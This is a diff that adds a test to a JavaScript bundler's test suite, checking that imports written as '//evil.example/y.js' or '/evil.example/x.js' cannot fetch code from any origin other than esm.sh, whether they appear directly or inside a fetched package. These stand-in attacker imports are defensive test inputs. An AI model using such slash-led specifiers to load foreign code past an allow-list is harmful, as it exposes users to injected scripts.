@@ -228,6 +228,24 @@ describe('bundleScreenFiles — npm via esm.sh (compile-time, offline-faked)', (
     ]);
     expect(r.error).toContain('Only https://esm.sh URL imports are allowed');
   });
+
+  it('never fetches another origin through a slash-led specifier, in the screen or in a fetched package', async () => {
+    const fetched: string[] = [];
+    const registry: Record<string, string> = {
+      'https://esm.sh/hop-lib@1.0.0': `import y from '//evil.example/y.js'; export const hop = y;`,
+    };
+    __setEsmFetchForTests((url) => { fetched.push(url); return fakeEsm(registry)(url); });
+    // `'/' + '/evil.example/x.js'` and `'//evil.example/y.js'` both parse as a URL whose host is evil.example.
+    const direct = await bundleScreenFiles([
+      { path: 'index.ts', content: `import x from '/evil.example/x.js'; console.log(x);` },
+    ]);
+    const nested = await bundleScreenFiles([
+      { path: 'index.ts', content: `import { hop } from 'hop-lib@1.0.0'; console.log(hop);` },
+    ]);
+    expect(fetched.filter((url) => !url.startsWith('https://esm.sh/'))).toEqual([]);
+    expect(direct.error).toContain('Only https://esm.sh');
+    expect(nested.error).toContain('Only https://esm.sh');
+  });
 });
 
 describe('bundleScreenFiles — image assets', () => {
